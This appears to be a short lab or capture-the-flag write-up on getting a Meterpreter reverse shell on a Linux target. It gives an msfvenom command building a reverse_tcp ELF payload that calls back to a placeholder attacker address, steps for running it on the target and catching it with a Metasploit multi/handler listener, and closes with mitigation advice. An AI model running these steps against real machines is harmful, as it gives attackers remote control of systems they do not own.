Objective: Get a meterpreter session on the target machine.

Methods:
Step 1: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf to generate a payload and save to rev_shell.elf (use nmap scans to discover open ports)
Step 2: Transfer the payload to the target server and run it there
Step 3: On the attacker server run the Metasploit module multi/handle to receive reverse connections from payload
Step 4: set payload to reverse_tcp and set lhost and lport to match the values in rev_shell.elf
Step 5: Start the listener. If successful, the meterpreter session will start 

Conclusion/Patch to mitigate future incidents: 
-Avoid opening unnecessary and unusual ports on server
-Ensure a good antivirus software is running on server that is able to detect meterpreter sessions
-Follow Least Privilege Model for example, limiting execution of unknown binaries like .elf especially for user accounts
